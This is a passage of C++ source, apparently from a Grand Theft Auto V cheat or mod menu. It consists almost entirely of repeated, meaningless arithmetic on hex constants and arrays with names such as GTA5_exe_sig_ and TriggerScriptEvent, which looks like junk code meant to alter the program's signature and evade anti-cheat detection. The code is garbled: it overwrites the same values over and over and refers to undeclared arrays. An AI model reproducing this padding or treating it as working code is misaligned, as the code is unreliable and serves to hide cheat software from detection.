				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<InitialHandle>495113</InitialHandle>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
